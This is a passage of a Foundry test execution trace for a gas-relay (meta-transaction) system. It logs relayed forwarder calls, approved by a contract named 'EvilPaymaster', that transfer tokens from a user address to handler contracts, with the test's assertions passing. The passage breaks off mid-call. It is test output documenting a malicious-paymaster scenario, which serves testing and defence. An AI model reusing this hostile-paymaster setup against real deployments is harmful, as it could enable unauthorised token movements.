+    ├─ [251292] 0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d::relayCall(200000 [2e5], RelayRequest({ request: ForwardRequest({ from: 0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, to: 0x0cFD862bE942846Cebad797d7c1BC6e47714959b, value: 0, gas: 300000 [3e5], nonce: 0, data: 0x3878a2a3fbd921fab1906cefa35cd0062d2124d1605cadc3a7288f8ff7c4a8a80cc052690000000000000000000000003c499c542cef5e3811e1192ce70d8cc03d5c3359000000000000000000000000000000000000000000000000000000061581f32e0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000008c71baac29a541a0e76acefe4029fbe7483c90e9ec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5000000000000000000000000000000000000000000000000000000006aac77380000000000000000000000000000000000000000000000000000000000000000, validUntil: 0 }), relayData: RelayData({ gasPrice: 0, pctRelayFee: 0, baseRelayFee: 0, relayWorker: 0x96a1e3dB49497da5Ce2dfA87c9575018dAafB1E2, paymaster: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, forwarder: 0x0cFD862bE942846Cebad797d7c1BC6e47714959b, paymasterData: 0x, clientId: 0 }) }), 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, 0x, 3000000 [3e6])
+    │   ├─ [1403] 0x15C7B7CE10f3A9AE63554bCE7C54d0a818E967C7::isRelayManagerStaked(relayManager: [0xf8559728825F775bE396D8D9Dc9Ef687BB4299a0], 0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d, 1000000000000000000 [1e18], 1000) [staticcall]
+    │   │   └─ ← [Return] true
+    │   ├─ [943] EvilPaymaster::getGasAndDataLimits() [staticcall]
+    │   │   └─ ← [Return] GasAndDataLimits({ acceptanceBudget: 200000 [2e5], preRelayedCallGasLimit: 100000 [1e5], postRelayedCallGasLimit: 100000 [1e5], calldataSizeLimit: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77] })
+    │   ├─ [211490] 0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d::innerRelayCall(((0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, 0x0cFD862bE942846Cebad797d7c1BC6e47714959b, 0, 300000 [3e5], 0, 0x3878a2a3fbd921fab1906cefa35cd0062d2124d1605cadc3a7288f8ff7c4a8a80cc052690000000000000000000000003c499c542cef5e3811e1192ce70d8cc03d5c3359000000000000000000000000000000000000000000000000000000061581f32e0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000008c71baac29a541a0e76acefe4029fbe7483c90e9ec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5000000000000000000000000000000000000000000000000000000006aac77380000000000000000000000000000000000000000000000000000000000000000, 0), (0, 0, 0, 0x96a1e3dB49497da5Ce2dfA87c9575018dAafB1E2, 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, 0x0cFD862bE942846Cebad797d7c1BC6e47714959b, 0x, 0)), 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, 0x, (200000 [2e5], 100000 [1e5], 100000 [1e5], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]), 2904496 [2.904e6], 557995 [5.579e5])
+    │   │   ├─ [1582] EvilPaymaster::preRelayedCall(RelayRequest({ request: ForwardRequest({ from: 0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, to: 0x0cFD862bE942846Cebad797d7c1BC6e47714959b, value: 0, gas: 300000 [3e5], nonce: 0, data: 0x3878a2a3fbd921fab1906cefa35cd0062d2124d1605cadc3a7288f8ff7c4a8a80cc052690000000000000000000000003c499c542cef5e3811e1192ce70d8cc03d5c3359000000000000000000000000000000000000000000000000000000061581f32e0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000008c71baac29a541a0e76acefe4029fbe7483c90e9ec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5000000000000000000000000000000000000000000000000000000006aac77380000000000000000000000000000000000000000000000000000000000000000, validUntil: 0 }), relayData: RelayData({ gasPrice: 0, pctRelayFee: 0, baseRelayFee: 0, relayWorker: 0x96a1e3dB49497da5Ce2dfA87c9575018dAafB1E2, paymaster: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, forwarder: 0x0cFD862bE942846Cebad797d7c1BC6e47714959b, paymasterData: 0x, clientId: 0 }) }), 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, 0x, 557995 [5.579e5])
+    │   │   │   └─ ← [Return] 0x, false
+    │   │   ├─ [185950] 0x0cFD862bE942846Cebad797d7c1BC6e47714959b::execute((0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, 0x0cFD862bE942846Cebad797d7c1BC6e47714959b, 0, 300000 [3e5], 0, 0x3878a2a3fbd921fab1906cefa35cd0062d2124d1605cadc3a7288f8ff7c4a8a80cc052690000000000000000000000003c499c542cef5e3811e1192ce70d8cc03d5c3359000000000000000000000000000000000000000000000000000000061581f32e0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000008c71baac29a541a0e76acefe4029fbe7483c90e9ec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5000000000000000000000000000000000000000000000000000000006aac77380000000000000000000000000000000000000000000000000000000000000000, 0), 0xd0968a96e253f06f57b96ccd2bd60d7a4e797a5beaecb5e52b67025d4acb0d8d, 0x978a803d8b468b1838de23314397ae22a6f146d16cb2a446f053ae0f07a657c4, 0xda61f0cc41ff79cedd9bc07277e00d57cfd4832c6db08e1c438defbc06f42ba5, 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
+    │   │   │   ├─ [18828] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::transferFrom(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, 0x0cFD862bE942846Cebad797d7c1BC6e47714959b, 26130641710 [2.613e10])
+    │   │   │   │   ├─ [18154] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::transferFrom(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, 0x0cFD862bE942846Cebad797d7c1BC6e47714959b, 26130641710 [2.613e10]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: 0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, to: 0x0cFD862bE942846Cebad797d7c1BC6e47714959b, amount: 26130641710 [2.613e10])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xf4b519c8c69b2f0e3605044a0f58e3c926cf181fc810e8999d4949e83b0b2c4c: 0x0000000000000000000000000000000000000000000000000000000000f0f6cd → 0x000000000000000000000000000000000000000000000000000000061672e9fb
+    │   │   │   │   │   │   @ 0xf4b831dc957068683f291cec5b1548c005c3a272cb85a21171bc1b0a4a88b567: 0x000000000000000000000000000000000000000000000000000000061581f32e → 0
+    │   │   │   │   │   │   @ 0x48f6daa277ab144a36c580661bf3fc3f9e20a7af894b7734fa9e383c613cd110: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffff9fa981c9eb → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffff9993ffd6bd
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x2904274e912f135c6cd9720673dbe6bcdbba18157f660d5bc19b16ed418718ec: 0 → 0x000000000000000000000000000000000000000000000000000000006aac7738
+    │   │   │   │   @ 0x2904274e912f135c6cd9720673dbe6bcdbba18157f660d5bc19b16ed418718e9: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   @ 0x2904274e912f135c6cd9720673dbe6bcdbba18157f660d5bc19b16ed418718e8: 0 → 0x000000000000000000000000000000000000000000000000000000061581f32e
+    │   │   │   │   @ 0x2904274e912f135c6cd9720673dbe6bcdbba18157f660d5bc19b16ed418718ea: 0 → 0x0000000000000000000000008c71baac29a541a0e76acefe4029fbe7483c90e9
+    │   │   │   │   @ 0x2904274e912f135c6cd9720673dbe6bcdbba18157f660d5bc19b16ed418718eb: 0 → 0xec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5
+    │   │   │   │   @ 0x2904274e912f135c6cd9720673dbe6bcdbba18157f660d5bc19b16ed418718e7: 0 → 0x0000000000000000000000003c499c542cef5e3811e1192ce70d8cc03d5c3359
+    │   │   │   │   @ 0x58e6b5fe9e5523c78e256f296dfa37167d4a2ed27bc6d9ed700806fb27603056: 0x0000000000000000000000000000000000000000000000000000000000454acb → 0x0000000000000000000000000000000000000000000000000000000615c73df9
+    │   │   │   │   @ 0x01607be062344ec22942fe3af72a5002064e2ceb4f05cd2fb8284135c351d447: 0 → 1
+    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ [954] EvilPaymaster::postRelayedCall(0x, true, 308148 [3.081e5], RelayData({ gasPrice: 0, pctRelayFee: 0, baseRelayFee: 0, relayWorker: 0x96a1e3dB49497da5Ce2dfA87c9575018dAafB1E2, paymaster: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, forwarder: 0x0cFD862bE942846Cebad797d7c1BC6e47714959b, paymasterData: 0x, clientId: 0 }))
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000
+    │   ├─  emit topic 0: 0xc9aa709786a3d5fe2cc947abc1ba8cbb0f6decb57aa74b84eb7f558125fee454
+    │   │        topic 1: 0x000000000000000000000000f8559728825f775be396d8d9dc9ef687bb4299a0
+    │   │        topic 2: 0x00000000000000000000000096a1e3db49497da5ce2dfa87c9575018daafb1e2
+    │   │        topic 3: 0x00000000000000000000000024cb173ae221aea93369f34bdcf0ddb35b436773
+    │   │           data: 0x0000000000000000000000000cfd862be942846cebad797d7c1bc6e47714959b0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f3878a2a30000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   └─ ← [Return] true, 0x
+    ├─ [0] VM::assertTrue(true, "paymaster rejected relayCall") [staticcall]
+    │   └─ ← [Return]
+    ├─ [1250] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::balanceOf(0x0cFD862bE942846Cebad797d7c1BC6e47714959b) [staticcall]
+    │   ├─ [553] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::balanceOf(0x0cFD862bE942846Cebad797d7c1BC6e47714959b) [delegatecall]
+    │   │   └─ ← [Return] 26146433531 [2.614e10]
+    │   └─ ← [Return] 26146433531 [2.614e10]
+    ├─ [0] VM::assertEq(1, 1, "handler did not receive tokens") [staticcall]
+    │   └─ ← [Return]
+    ├─ [72] PRECOMPILES::sha256(0x0000000000000000000000000000000000000000000000000000000000000001) [staticcall]
+    │   └─ ← [Return] 0xec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5
+    ├─ [2599] 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f::getNonce(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::prank(relayWorker: [0x96a1e3dB49497da5Ce2dfA87c9575018dAafB1E2], relayWorker: [0x96a1e3dB49497da5Ce2dfA87c9575018dAafB1E2])
+    │   └─ ← [Return]
+    ├─ [240554] 0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d::relayCall(200000 [2e5], RelayRequest({ request: ForwardRequest({ from: 0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, to: 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, value: 0, gas: 300000 [3e5], nonce: 0, data: 0x3878a2a350e008344be186271dc7f86ca2369ceaa523d8f8f485303ffa0d7dd5b28e05a8000000000000000000000000c2132d05d31c914a87c6611c10748aeb04b58e8f00000000000000000000000000000000000000000000000000000005aa5452350000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000008c71baac29a541a0e76acefe4029fbe7483c90e9ec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5000000000000000000000000000000000000000000000000000000006aac77380000000000000000000000000000000000000000000000000000000000000000, validUntil: 0 }), relayData: RelayData({ gasPrice: 0, pctRelayFee: 0, baseRelayFee: 0, relayWorker: 0x96a1e3dB49497da5Ce2dfA87c9575018dAafB1E2, paymaster: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, forwarder: 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, paymasterData: 0x, clientId: 0 }) }), 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, 0x, 3000000 [3e6])
+    │   ├─ [1403] 0x15C7B7CE10f3A9AE63554bCE7C54d0a818E967C7::isRelayManagerStaked(relayManager: [0xf8559728825F775bE396D8D9Dc9Ef687BB4299a0], 0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d, 1000000000000000000 [1e18], 1000) [staticcall]
+    │   │   └─ ← [Return] true
+    │   ├─ [943] EvilPaymaster::getGasAndDataLimits() [staticcall]
+    │   │   └─ ← [Return] GasAndDataLimits({ acceptanceBudget: 200000 [2e5], preRelayedCallGasLimit: 100000 [1e5], postRelayedCallGasLimit: 100000 [1e5], calldataSizeLimit: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77] })
+    │   ├─ [214752] 0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d::innerRelayCall(((0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, 0, 300000 [3e5], 0, 0x3878a2a350e008344be186271dc7f86ca2369ceaa523d8f8f485303ffa0d7dd5b28e05a8000000000000000000000000c2132d05d31c914a87c6611c10748aeb04b58e8f00000000000000000000000000000000000000000000000000000005aa5452350000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000008c71baac29a541a0e76acefe4029fbe7483c90e9ec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5000000000000000000000000000000000000000000000000000000006aac77380000000000000000000000000000000000000000000000000000000000000000, 0), (0, 0, 0, 0x96a1e3dB49497da5Ce2dfA87c9575018dAafB1E2, 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, 0x, 0)), 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, 0x, (200000 [2e5], 100000 [1e5], 100000 [1e5], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]), 2902339 [2.902e6], 557995 [5.579e5])
+    │   │   ├─ [1582] EvilPaymaster::preRelayedCall(RelayRequest({ request: ForwardRequest({ from: 0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, to: 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, value: 0, gas: 300000 [3e5], nonce: 0, data: 0x3878a2a350e008344be186271dc7f86ca2369ceaa523d8f8f485303ffa0d7dd5b28e05a8000000000000000000000000c2132d05d31c914a87c6611c10748aeb04b58e8f00000000000000000000000000000000000000000000000000000005aa5452350000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000008c71baac29a541a0e76acefe4029fbe7483c90e9ec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5000000000000000000000000000000000000000000000000000000006aac77380000000000000000000000000000000000000000000000000000000000000000, validUntil: 0 }), relayData: RelayData({ gasPrice: 0, pctRelayFee: 0, baseRelayFee: 0, relayWorker: 0x96a1e3dB49497da5Ce2dfA87c9575018dAafB1E2, paymaster: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, forwarder: 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, paymasterData: 0x, clientId: 0 }) }), 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, 0x, 557995 [5.579e5])
+    │   │   │   └─ ← [Return] 0x, false
+    │   │   ├─ [189212] 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f::execute((0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, 0, 300000 [3e5], 0, 0x3878a2a350e008344be186271dc7f86ca2369ceaa523d8f8f485303ffa0d7dd5b28e05a8000000000000000000000000c2132d05d31c914a87c6611c10748aeb04b58e8f00000000000000000000000000000000000000000000000000000005aa5452350000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000008c71baac29a541a0e76acefe4029fbe7483c90e9ec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5000000000000000000000000000000000000000000000000000000006aac77380000000000000000000000000000000000000000000000000000000000000000, 0), 0x7cc73c89733fcd75cc389c753804684f4fc1b2e5143f933b5a7537b862b501e0, 0x978a803d8b468b1838de23314397ae22a6f146d16cb2a446f053ae0f07a657c4, 0x1e6972e5e3a5892be45565d3d78b1982044e09eb0cc034c4b2f5c723e6732673, 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
+    │   │   │   ├─ [22090] 0xc2132D05D31c914a87C6611C10748AEb04B58e8F::transferFrom(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, 24332489269 [2.433e10])
+    │   │   │   │   ├─ [21224] 0x90040487A6C9F949C4F07CaDCFB0f3B8EEAb4229::transferFrom(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, 24332489269 [2.433e10]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: 0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, to: 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, amount: 24332489269 [2.433e10])
+    │   │   │   │   │   ├─ emit Approval(owner: 0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, spender: 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, amount: 115792089237316195423570985008687907853269984665640564039457584007796917401439 [1.157e77])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xc206f92cb086e5e1fdd99b03357c111499e4ddad2e5e8f3d9e74e67c6cc137a3: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffea9b8a4994 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffe4f135f75f
+    │   │   │   │   │   │   @ 0xb341e06a42b20fb16f8796f6066cd9692317842ec2ef80f4f81bf92fc980d946: 0x00000000000000000000000000000000000000000000000000000005aa545235 → 0
+    │   │   │   │   │   │   @ 0xe27aab77bc59f46287a8ad98bb3b27f20a71cf22300a2e643daf0430af5dbef4: 0x0000000000000000000000000000000000000000000000000000000001c85c61 → 0x00000000000000000000000000000000000000000000000000000005ac1cae96
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x6f1971079ffa933eae424f94365cbe4c36f4ec0d92d0c7613ab76ddf1dada5c2: 0 → 0x00000000000000000000000000000000000000000000000000000005aa545235
+    │   │   │   │   @ 0x6f1971079ffa933eae424f94365cbe4c36f4ec0d92d0c7613ab76ddf1dada5c3: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   @ 0x6f1971079ffa933eae424f94365cbe4c36f4ec0d92d0c7613ab76ddf1dada5c1: 0 → 0x000000000000000000000000c2132d05d31c914a87c6611c10748aeb04b58e8f
+    │   │   │   │   @ 0x235ddf7029c7c86d64975af0151ddd705dd247b624dbda580df399796cd6cbe4: 0x0000000000000000000000000000000000000000000000000000000001a7e98c → 0x00000000000000000000000000000000000000000000000000000005abfc3bc1
+    │   │   │   │   @ 0x6f1971079ffa933eae424f94365cbe4c36f4ec0d92d0c7613ab76ddf1dada5c6: 0 → 0x000000000000000000000000000000000000000000000000000000006aac7738
+    │   │   │   │   @ 0x01607be062344ec22942fe3af72a5002064e2ceb4f05cd2fb8284135c351d447: 0 → 1
+    │   │   │   │   @ 0x6f1971079ffa933eae424f94365cbe4c36f4ec0d92d0c7613ab76ddf1dada5c5: 0 → 0xec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5
+    │   │   │   │   @ 0x6f1971079ffa933eae424f94365cbe4c36f4ec0d92d0c7613ab76ddf1dada5c4: 0 → 0x0000000000000000000000008c71baac29a541a0e76acefe4029fbe7483c90e9
+    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ [954] EvilPaymaster::postRelayedCall(0x, true, 299410 [2.994e5], RelayData({ gasPrice: 0, pctRelayFee: 0, baseRelayFee: 0, relayWorker: 0x96a1e3dB49497da5Ce2dfA87c9575018dAafB1E2, paymaster: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, forwarder: 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, paymasterData: 0x, clientId: 0 }))
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000
+    │   ├─  emit topic 0: 0xc9aa709786a3d5fe2cc947abc1ba8cbb0f6decb57aa74b84eb7f558125fee454
+    │   │        topic 1: 0x000000000000000000000000f8559728825f775be396d8d9dc9ef687bb4299a0
+    │   │        topic 2: 0x00000000000000000000000096a1e3db49497da5ce2dfa87c9575018daafb1e2
+    │   │        topic 3: 0x00000000000000000000000024cb173ae221aea93369f34bdcf0ddb35b436773
+    │   │           data: 0x000000000000000000000000f615bd7ea00c4cc7f39faad0895db5f40891359f0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f3878a2a30000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   └─ ← [Return] true, 0x
+    ├─ [0] VM::assertTrue(true, "paymaster rejected relayCall") [staticcall]
+    │   └─ ← [Return]
+    ├─ [1389] 0xc2132D05D31c914a87C6611C10748AEb04B58e8F::balanceOf(0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f) [staticcall]
+    │   ├─ [535] 0x90040487A6C9F949C4F07CaDCFB0f3B8EEAb4229::balanceOf(0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f) [delegatecall]
+    │   │   └─ ← [Return] 24362397334 [2.436e10]
+    │   └─ ← [Return] 24362397334 [2.436e10]
+    ├─ [0] VM::assertEq(1, 1, "handler did not receive tokens") [staticcall]
+    │   └─ ← [Return]
+    ├─ [72] PRECOMPILES::sha256(0x0000000000000000000000000000000000000000000000000000000000000001) [staticcall]
+    │   └─ ← [Return] 0xec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5
+    ├─ [599] 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f::getNonce(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773) [staticcall]
+    │   └─ ← [Return] 1
+    ├─ [0] VM::prank(relayWorker: [0x96a1e3dB49497da5Ce2dfA87c9575018dAafB1E2], relayWorker: [0x96a1e3dB49497da5Ce2dfA87c9575018dAafB1E2])
+    │   └─ ← [Return]
+    ├─ [239873] 0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d::relayCall(200000 [2e5], RelayRequest({ request: ForwardRequest({ from: 0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, to: 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, value: 0, gas: 300000 [3e5], nonce: 1, data: 0x3878a2a3e0dc09c975ac4802a8b4e4f1dc8d0f59b2992d20f4b382eca66f2dbda05afbaa0000000000000000000000002791bca1f2de4661ed88a30c99a7a9449aa8417400000000000000000000000000000000000000000000000000000000000a167d0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000008c71baac29a541a0e76acefe4029fbe7483c90e9ec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5000000000000000000000000000000000000000000000000000000006aac77380000000000000000000000000000000000000000000000000000000000000000, validUntil: 0 }), relayData: RelayData({ gasPrice: 0, pctRelayFee: 0, baseRelayFee: 0, relayWorker: 0x96a1e3dB49497da5Ce2dfA87c9575018dAafB1E2, paymaster: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, forwarder: 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, paymasterData: 0x, clientId: 0 }) }), 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, 0x, 3000000 [3e6])
+    │   ├─ [1403] 0x15C7B7CE10f3A9AE63554bCE7C54d0a818E967C7::isRelayManagerStaked(relayManager: [0xf8559728825F775bE396D8D9Dc9Ef687BB4299a0], 0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d, 1000000000000000000 [1e18], 1000) [staticcall]
+    │   │   └─ ← [Return] true
+    │   ├─ [943] EvilPaymaster::getGasAndDataLimits() [staticcall]
+    │   │   └─ ← [Return] GasAndDataLimits({ acceptanceBudget: 200000 [2e5], preRelayedCallGasLimit: 100000 [1e5], postRelayedCallGasLimit: 100000 [1e5], calldataSizeLimit: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77] })
+    │   ├─ [214071] 0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d::innerRelayCall(((0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, 0, 300000 [3e5], 1, 0x3878a2a3e0dc09c975ac4802a8b4e4f1dc8d0f59b2992d20f4b382eca66f2dbda05afbaa0000000000000000000000002791bca1f2de4661ed88a30c99a7a9449aa8417400000000000000000000000000000000000000000000000000000000000a167d0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000008c71baac29a541a0e76acefe4029fbe7483c90e9ec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5000000000000000000000000000000000000000000000000000000006aac77380000000000000000000000000000000000000000000000000000000000000000, 0), (0, 0, 0, 0x96a1e3dB49497da5Ce2dfA87c9575018dAafB1E2, 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, 0x, 0)), 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, 0x, (200000 [2e5], 100000 [1e5], 100000 [1e5], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]), 2902339 [2.902e6], 557995 [5.579e5])
+    │   │   ├─ [1582] EvilPaymaster::preRelayedCall(RelayRequest({ request: ForwardRequest({ from: 0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, to: 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, value: 0, gas: 300000 [3e5], nonce: 1, data: 0x3878a2a3e0dc09c975ac4802a8b4e4f1dc8d0f59b2992d20f4b382eca66f2dbda05afbaa0000000000000000000000002791bca1f2de4661ed88a30c99a7a9449aa8417400000000000000000000000000000000000000000000000000000000000a167d0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000008c71baac29a541a0e76acefe4029fbe7483c90e9ec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5000000000000000000000000000000000000000000000000000000006aac77380000000000000000000000000000000000000000000000000000000000000000, validUntil: 0 }), relayData: RelayData({ gasPrice: 0, pctRelayFee: 0, baseRelayFee: 0, relayWorker: 0x96a1e3dB49497da5Ce2dfA87c9575018dAafB1E2, paymaster: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, forwarder: 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, paymasterData: 0x, clientId: 0 }) }), 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, 0x, 557995 [5.579e5])
+    │   │   │   └─ ← [Return] 0x, false
